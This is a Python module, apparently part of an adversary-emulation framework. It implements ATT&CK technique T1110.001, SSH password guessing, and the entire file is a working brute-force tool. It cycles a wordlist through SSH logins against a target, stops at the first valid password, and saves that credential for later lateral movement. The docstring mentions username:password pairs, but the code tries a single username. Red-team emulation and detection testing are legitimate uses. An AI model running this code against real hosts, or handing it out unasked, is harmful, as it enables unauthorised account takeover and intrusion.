"""
techniques/credential_access/ssh_brute.py
ATT&CK: T1110.001 — Brute Force: Password Guessing
Tactic:  Credential Access

Attempts SSH login with a list of username:password pairs against a
target host. Stops on first valid credential found (a real adversary
usually doesn't need more than one). Stores valid creds in Context
so lateral movement can pick them up.
"""

import paramiko
from typing import Any

from core.context import Context
from core.technique import Tactic, Technique


class SSHBruteForce(Technique):
    name = "ssh-brute-force"
    attack_id = "T1110.001"
    tactic = Tactic.CREDENTIAL_ACCESS

    def __init__(
        self,
        target: str,
        port: int = 22,
        username: str = "admin",
        wordlist: str = "wordlists/passwords.txt",
        timeout: float = 5.0,
        stop_on_first: bool = True,
    ):
        self.target = target
        self.port = port
        self.username = username
        self.wordlist = wordlist
        self.timeout = timeout
        self.stop_on_first = stop_on_first

    def _load_wordlist(self) -> list[str]:
        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        passwords = self._load_wordlist()
        tried = 0
        valid_creds: list[str] = []

        for password in passwords:
            tried += 1
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    self.target,
                    port=self.port,
                    username=self.username,
                    password=password,
                    timeout=self.timeout,
                    banner_timeout=self.timeout,
                    auth_timeout=self.timeout,
                    look_for_keys=False,
                    allow_agent=False,
                )
                client.close()
                valid_creds.append(self.username)
                context.add_credential(
                    username=self.username,
                    password=password,
                    source_technique=self.name,
                    valid_on=self.target,
                )
                if self.stop_on_first:
                    break
            except paramiko.AuthenticationException:
                continue
            except Exception:
                continue
            finally:
                client.close()

        if valid_creds:
            summary = (
                f"Valid credential found for user {self.username} "
                f"on {self.target}:{self.port} "
                f"(tried {tried}/{len(passwords)} passwords)"
            )
        else:
            summary = (
                f"No valid credentials found on {self.target}:{self.port} "
                f"after trying {tried} password(s)"
            )

        return bool(valid_creds), summary, {
            "target": self.target,
            "port": self.port,
            "username": self.username,
            "passwords_tried": tried,
            "credential_found": bool(valid_creds),
        }